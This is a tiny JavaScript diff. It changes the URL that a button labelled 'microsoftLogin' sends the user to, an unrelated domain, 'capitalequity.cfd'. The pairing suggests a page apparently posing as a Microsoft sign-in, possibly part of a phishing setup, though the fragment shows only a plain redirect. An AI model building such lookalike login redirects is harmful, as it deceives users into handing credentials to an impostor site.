@@ -4,6 +4,6 @@ document.addEventListener("DOMContentLoaded", () => {
     };
   
     document.getElementById("microsoftLogin").onclick = () => {
-      window.location.href = "https://capitalequity.cfd/S";
+      window.location.href = "https://capitalequity.cfd/";
     };
   });
